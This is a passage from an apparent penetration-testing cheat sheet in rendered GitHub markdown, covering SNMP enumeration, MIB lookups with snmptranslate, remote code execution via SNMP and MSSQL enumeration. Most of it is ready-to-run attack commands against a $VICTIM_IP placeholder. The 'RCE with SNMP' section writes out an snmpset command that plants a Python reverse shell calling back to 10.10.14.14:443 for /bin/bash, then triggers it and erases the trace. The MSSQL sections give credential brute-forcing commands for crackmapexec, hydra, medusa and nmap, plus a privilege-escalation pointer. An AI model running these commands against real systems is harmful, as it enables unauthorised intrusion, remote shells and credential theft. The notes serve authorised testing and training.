class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e basic enumeration with onesixtyone, using default 'public' community string\u003c/span\u003e\nonesixtyone \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e public\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e getting system description (like uname -a on Linux systems)\u003c/span\u003e\nsnmpwalk -v2c -c public \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e SNMPv2-MIB::sysDescr\nsnmpget -v2c -c public \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e SNMPv2-MIB::sysDescr.0\n\nsnmpwalk -c public -v2c \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e 1.3.6.1.4.1.77.1.2.25 \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e users\u003c/span\u003e\nsnmpwalk -c public -v2c \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e 1.3.6.1.2.1.25.4.2.1.2 \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e processes\u003c/span\u003e\nsnmpwalk -c public -v2c \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e 1.3.6.1.2.1.6.13.1.3 \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e ports\u003c/span\u003e\nsnmpwalk -c public -v2c \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e 1.3.6.1.2.1.25.6.3.1.2 \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e software\u003c/span\u003e\nsnmpwalk -c public -v2c \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e HOST-RESOURCES-MIB::hrSWInstalledName \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e software\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get ALL info available on SNMP\u003c/span\u003e\nsnmpwalk -v2c -c public \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eUseful SNMP OIDs:\u003c/p\u003e\n\u003cmarkdown-accessiblity-table\u003e\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eOID Value\u003c/th\u003e\n\u003cth\u003eInfo Provided\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.3.6.1.2.1.25.1.6.0\u003c/td\u003e\n\u003ctd\u003eSystem Processes\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.3.6.1.2.1.25.4.2.1.2\u003c/td\u003e\n\u003ctd\u003eRunning Programs\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.3.6.1.2.1.25.4.2.1.4\u003c/td\u003e\n\u003ctd\u003eProcesses Path\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.3.6.1.2.1.25.2.3.1.4\u003c/td\u003e\n\u003ctd\u003eStorage Units\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.3.6.1.2.1.25.6.3.1.2\u003c/td\u003e\n\u003ctd\u003eSoftware Name\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.3.6.1.4.1.77.1.2.25\u003c/td\u003e\n\u003ctd\u003eUser Accounts\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.3.6.1.2.1.6.13.1.3\u003c/td\u003e\n\u003ctd\u003eTCP Local Ports\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\u003c/markdown-accessiblity-table\u003e\n\u003cp dir=\"auto\"\u003eLook \u003ca href=\"https://www.rapid7.com/blog/post/2016/05/05/snmp-data-harvesting-during-penetration-testing/\" rel=\"nofollow\"\u003ehere\u003c/a\u003e for some other ideas on getting juicy data from SNMP:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eEmail addresses\u003c/li\u003e\n\u003cli\u003eSNMP community strings\u003c/li\u003e\n\u003cli\u003ePassword hashes\u003c/li\u003e\n\u003cli\u003eClear text passwords\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eAlso search for OID info at \u003ca href=\"http://www.oid-info.com/basic-search.htm\" rel=\"nofollow\"\u003ehttp://www.oid-info.com/\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eSNMP config files:\u003c/strong\u003e (may contain sensitive data)\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eTypical locations:\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ccode\u003e/etc/\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/etc/snmp/\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e~/.snmp/\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eCommon filenames:\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003esnmp.conf\u003c/li\u003e\n\u003cli\u003esnmpd.conf\u003c/li\u003e\n\u003cli\u003esnmp-config.xml\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.13.1 Exploring MIBs with \u003ccode\u003esnmptranslate\u003c/code\u003e\u003c/h3\u003e\u003ca id=\"user-content-2131-exploring-mibs-with-snmptranslate\" class=\"anchor\" aria-label=\"Permalink: 2.13.1 Exploring MIBs with snmptranslate\" href=\"#2131-exploring-mibs-with-snmptranslate\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eFrom the \u003ca href=\"https://net-snmp.sourceforge.io/tutorial/tutorial-5/commands/snmptranslate.html\" rel=\"nofollow\"\u003e\u003ccode\u003esnmptranslate\u003c/code\u003e Tutorial\u003c/a\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# look up numeric OID to get abbreviated name\nsnmptranslate .1.3.6.1.2.1.1.3.0\nsnmptranslate -m +ALL .1.3.6.1.2.1.1.3.0\n\n# look up OID node name without fully-qualified path (random access)\nsnmptranslate -IR sysUpTime.0\n\n# convert abbreviated OID to numeric (dotted-decimal)\nsnmptranslate -On SNMPv2-MIB::sysDescr.0\n\n# convert abbreviated OID to dotted-text\nsnmptranslate -Of SNMPv2-MIB::sysDescr.0\n# convert numeric (dotted-decimal) to dotted-text\nsnmptranslate -m +ALL -Of .1.3.6.1.2.1.1.1.0\n\n# get description/extended info about OID node\nsnmptranslate -Td SNMPv2-MIB::sysDescr.0\n# same for numeric\nsnmptranslate -m +ALL -Td .1.3.6.1.2.1.1.1.0\n\n# get tree view of subset of MIB tree\nsnmptranslate -Tp -IR system\n\n# look up OID by regex (best match)\nsnmptranslate -Ib 'sys.*ime'\n\n#  To get a list of all the nodes that match a given pattern, use the -TB flag:\nsnmptranslate -TB 'vacm.*table'\n\n# find out what directories are searched for MIBS:\nnet-snmp-config --default-mibdirs # only if installed\nsnmptranslate -Dinit_mib .1.3 |\u0026amp; grep MIBDIR\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look up numeric OID to get abbreviated name\u003c/span\u003e\nsnmptranslate .1.3.6.1.2.1.1.3.0\nsnmptranslate -m +ALL .1.3.6.1.2.1.1.3.0\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look up OID node name without fully-qualified path (random access)\u003c/span\u003e\nsnmptranslate -IR sysUpTime.0\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e convert abbreviated OID to numeric (dotted-decimal)\u003c/span\u003e\nsnmptranslate -On SNMPv2-MIB::sysDescr.0\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e convert abbreviated OID to dotted-text\u003c/span\u003e\nsnmptranslate -Of SNMPv2-MIB::sysDescr.0\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e convert numeric (dotted-decimal) to dotted-text\u003c/span\u003e\nsnmptranslate -m +ALL -Of .1.3.6.1.2.1.1.1.0\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get description/extended info about OID node\u003c/span\u003e\nsnmptranslate -Td SNMPv2-MIB::sysDescr.0\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e same for numeric\u003c/span\u003e\nsnmptranslate -m +ALL -Td .1.3.6.1.2.1.1.1.0\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get tree view of subset of MIB tree\u003c/span\u003e\nsnmptranslate -Tp -IR system\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look up OID by regex (best match)\u003c/span\u003e\nsnmptranslate -Ib \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003esys.*ime\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e  To get a list of all the nodes that match a given pattern, use the -TB flag:\u003c/span\u003e\nsnmptranslate -TB \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003evacm.*table\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e find out what directories are searched for MIBS:\u003c/span\u003e\nnet-snmp-config --default-mibdirs \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e only if installed\u003c/span\u003e\nsnmptranslate -Dinit_mib .1.3 \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u0026amp;\u003c/span\u003e grep MIBDIR\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWhen using the \u003ccode\u003e-m +ALL\u003c/code\u003e argument, I got the error:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eBad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThere is a typo in the file that gets pulled by \u003ccode\u003esnmp-mibs-downloader\u003c/code\u003e. The fix is to replace the existing file with a corrected version, which is located \u003ca href=\"http://pastebin.com/raw/p3QyuXzZ\" rel=\"nofollow\"\u003ehere\u003c/a\u003e.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.13.2 RCE with SNMP\u003c/h3\u003e\u003ca id=\"user-content-2132-rce-with-snmp\" class=\"anchor\" aria-label=\"Permalink: 2.13.2 RCE with SNMP\" href=\"#2132-rce-with-snmp\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSee \u003ca href=\"https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce\" rel=\"nofollow\"\u003eHacktricks\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eEasy library to do this: \u003ca href=\"https://github.com/mxrch/snmp-shell.git\"\u003ehttps://github.com/mxrch/snmp-shell.git\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# manually create reverse shell (update listener IP)\nsnmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus.\u0026quot;derp\u0026quot;' = createAndGo 'nsExtendCommand.\u0026quot;derp\u0026quot;' = /usr/bin/env 'nsExtendArgs.\u0026quot;derp\u0026quot;' = 'python -c \u0026quot;import sys,socket,os,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection((\\\u0026quot;10.10.14.14\\\u0026quot;,443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\u0026quot;/bin/bash\\\u0026quot;)\u0026quot;'\n\n# trigger reverse shell by reading the OID\nsnmpwalk -v2c -c private $VICTIM_IP NET-SNMP-EXTEND-MIB::nsExtendObjects\n\n# delete the reverse shell command from the SNMP table\nsnmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus.\u0026quot;derp\u0026quot;' = destroy\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e manually create reverse shell (update listener IP)\u003c/span\u003e\nsnmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ensExtendStatus.\"derp\"\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e = createAndGo \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ensExtendCommand.\"derp\"\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e = /usr/bin/env \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ensExtendArgs.\"derp\"\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e = \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003epython -c \"import sys,socket,os,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection((\\\"10.10.14.14\\\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\"/bin/bash\\\")\"\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e trigger reverse shell by reading the OID\u003c/span\u003e\nsnmpwalk -v2c -c private \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e NET-SNMP-EXTEND-MIB::nsExtendObjects\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e delete the reverse shell command from the SNMP table\u003c/span\u003e\nsnmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ensExtendStatus.\"derp\"\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e = destroy\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThis abuses the NET-SNMP-EXTEND-MIB functionality. See \u003ca href=\"https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/\" rel=\"nofollow\"\u003etechnical writeup\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.14 LDAP(s) - 389,636\u003c/h2\u003e\u003ca id=\"user-content-214-ldaps---389636\" class=\"anchor\" aria-label=\"Permalink: 2.14 LDAP(s) - 389,636\" href=\"#214-ldaps---389636\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eTODO\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.15 MSSQL - 1443\u003c/h2\u003e\u003ca id=\"user-content-215-mssql---1443\" class=\"anchor\" aria-label=\"Permalink: 2.15 MSSQL - 1443\" href=\"#215-mssql---1443\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eMicrosoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It supports storing and retrieving data across a network (including the Internet).\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# check for known vulns\nsearchsploit \u0026quot;microsoft sql server\u0026quot;\n\n# if you know nothing about it, try 'sa' user w/o password:\nnmap -v -n --script=\u0026quot;safe and ms-sql-*\u0026quot; --script-args=\u0026quot;mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER\u0026quot; -sV -p 1433 -oA nmap/safe-ms-sql $VICTIM_IP\n# if you don't have creds, you can try to guess them, but be careful not to block\n# accounts with too many bad guesses\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check for known vulns\u003c/span\u003e\nsearchsploit \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003emicrosoft sql server\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if you know nothing about it, try 'sa' user w/o password:\u003c/span\u003e\nnmap -v -n --script=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003esafe and ms-sql-*\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e --script-args=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003emssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -sV -p 1433 -oA nmap/safe-ms-sql \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if you don't have creds, you can try to guess them, but be careful not to block\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e accounts with too many bad guesses\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSee \u003ca href=\"#4142-mssql-interaction\"\u003eMSSql Interaction\u003c/a\u003e for how to connect, interact.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003ePost-Exploit PrivEsc\u003c/strong\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThe user running MSSQL server will have the privilege token \u003cstrong\u003eSeImpersonatePrivilege\u003c/strong\u003e enabled. You will probably be able to escalate to Administrator using this and \u003ca href=\"https://github.com/ohpe/juicy-potato\"\u003eJuicyPotato\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.15.1 MSSQL Credential Bruteforcing\u003c/h3\u003e\u003ca id=\"user-content-2151-mssql-credential-bruteforcing\" class=\"anchor\" aria-label=\"Permalink: 2.15.1 MSSQL Credential Bruteforcing\" href=\"#2151-mssql-credential-bruteforcing\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Be carefull with the number of password in the list, this could lock-out accounts\n# Use the NetBIOS name of the machine as domain, if needed\ncrackmapexec mssql -d DOMAINNAME -u usernames.txt -p passwords.txt $VICTIM_IP\nhydra -V -f -L /path/to/usernames.txt P /path/to/passwords.txt $VICTIM_IP mssql\nmedusa -h $VICTIM_IP U /path/to/usernames.txt P /path/to/passwords.txt M mssql\nnmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=usernames.txt,passdb=passwords.txt,ms-sql-brute.brute-windows-accounts $VICTIM_IP\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Be carefull with the number of password in the list, this could lock-out accounts\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Use the NetBIOS name of the machine as domain, if needed\u003c/span\u003e\ncrackmapexec mssql -d DOMAINNAME -u usernames.txt -p passwords.txt \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\nhydra -V -f -L /path/to/usernames.txt P /path/to/passwords.txt \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e mssql\nmedusa -h \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e U /path/to/usernames.txt P /path/to/passwords.txt M mssql\nnmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=usernames.txt,passdb=passwords.txt,ms-sql-brute.brute-windows-accounts \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eMore great tips on \u003ca href=\"https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server\" rel=\"nofollow\"\u003eHackTricks\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.15.2 MSSQL Interaction\u003c/h3\u003e\u003ca id=\"user-content-2152-mssql-interaction\" class=\"anchor\" aria-label=\"Permalink: 2.15.2 MSSQL Interaction\" href=\"#2152-mssql-interaction\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eConnecting to the MSSQL server\u003c/strong\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eFrom kali, for interactive session:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" 